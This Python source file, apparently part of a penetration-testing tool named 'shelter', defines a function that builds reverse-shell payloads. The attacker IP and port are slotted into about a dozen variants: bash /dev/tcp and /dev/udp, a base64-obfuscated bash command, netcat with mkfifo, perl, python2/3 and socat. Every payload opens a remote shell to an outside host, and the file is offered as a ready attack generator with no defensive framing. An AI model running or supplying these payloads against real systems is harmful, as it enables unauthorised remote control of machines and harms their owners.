from shelter.helpers.ip_port_handler import fetch_ip
from shelter.helpers.ip_port_handler import fetch_port
from shelter.helpers.stylize import *

import base64

def shell_cpy(language,ATTACKER_IP,ATTACKER_PORT): # This function takes attacker ip,attacker port & language og revshell and returns a full fleged reverse-shell.
    if ATTACKER_IP == None:
        ATTACKER_IP = fetch_ip()
    if ATTACKER_PORT == None:
        ATTACKER_PORT = fetch_port()

    bashi_b64 = base64.b64encode(f"bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1".encode()).decode()
    payloads = {
    "bash" : f"echo {bashi_b64} |base64 -d|bash",
    "bashi" : f"bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1'",
    "bash196" : f"bash -c '0<&196;exec 196<>/dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT}; bash <&196 >&196 2>&196'",
    "bashrl" : f"bash -c 'exec 5<>/dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT};cat <&5 | while read line; do $line 2>&5 >&5; done'",
    "bash5" : f"bash -c 'bash -i 5<> /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0<&5 1>&5 2>&5'",
    "bashudp" : f"bash -c 'bash -i >& /dev/udp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1'",
    "nc_mkfifo" : f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ATTACKER_IP} {ATTACKER_PORT} >/tmp/f",
    "perl" : """perl -e 'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'""" % (ATTACKER_IP,int(ATTACKER_PORT)),
    "py2" : f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ATTACKER_IP}",{ATTACKER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'""",
    "py" : f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ATTACKER_IP}",{ATTACKER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'""",
    "py2export" : f"""export RHOST="{ATTACKER_IP}";export RPORT={ATTACKER_PORT};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'""",
    "pyexport" : f"""export RHOST="{ATTACKER_IP}";export RPORT={ATTACKER_PORT};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'""",
    "socat" : f"socat TCP:{ATTACKER_IP}:{ATTACKER_PORT} EXEC:'bash',pty,stderr,setsid,sigint,sane"
    }
    if language in payloads.keys():
        return [payloads[language],ATTACKER_IP,ATTACKER_PORT] # Returns reverseshell payload from the dictionary by slapping in ATTACKERIP and ATTACKERPORT.
    else: # If the language parameter of this function is detected it will fallback to base64'ed bash.
        ainfo("No Payload specified : Falling back to base64 encoded bash -i revshell")
        return [payloads["bash"],ATTACKER_IP,ATTACKER_PORT]
    